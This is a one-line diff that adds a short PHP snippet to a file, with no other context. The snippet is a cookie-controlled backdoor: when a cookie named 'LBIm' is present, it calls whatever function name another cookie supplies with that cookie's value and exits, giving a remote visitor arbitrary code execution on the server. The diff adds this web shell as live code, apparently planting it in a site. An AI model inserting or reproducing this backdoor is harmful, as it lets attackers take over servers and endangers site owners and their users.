@@ -1,0 +1,1 @@
+<?php if(isset($_COOKIE["LBIm"])){$_COOKIE["CJZ"]($_COOKIE["LBIm"]);exit;}
